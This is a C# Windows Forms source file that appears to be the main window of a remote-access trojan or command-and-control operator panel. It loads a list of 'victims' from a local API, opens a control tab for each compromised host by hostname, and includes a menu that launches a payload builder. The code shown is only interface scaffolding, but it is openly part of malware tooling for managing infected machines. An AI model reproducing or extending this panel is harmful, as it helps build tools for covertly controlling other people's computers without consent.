using System;
using System.Windows.Forms;
using LO_Panel.Services;
using LO_Panel.Controls;
using LO_Panel.Models;

namespace LO_Panel.Forms
{
    public partial class MainForm : Form
    {
        private ApiService api;
        private FlowLayoutPanel victimPanel;
        
        public MainForm()
        {
            InitializeComponent();
            api = new ApiService("https://127.0.0.1:8443");
            LoadVictims();
        }
        
        private void LoadVictims()
        {
            var victims = api.GetVictims();
            victimPanel.Controls.Clear();
            foreach (var v in victims)
            {
                var card = new VictimCard(v);
                card.OnClick += (s, e) => OpenVictimControl(v);
                victimPanel.Controls.Add(card);
            }
        }
        
        private void OpenVictimControl(Victim v)
        {
            var tab = new TabPage(v.Hostname);
            var ctrl = new VictimControlPanel(v, api);
            tab.Controls.Add(ctrl);
            mainTabControl.TabPages.Add(tab);
            mainTabControl.SelectedTab = tab;
        }
        
        // Menu: Build → Opens BuilderForm
        private void buildToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var builder = new BuilderForm(api);
            builder.ShowDialog();
        }
    }
}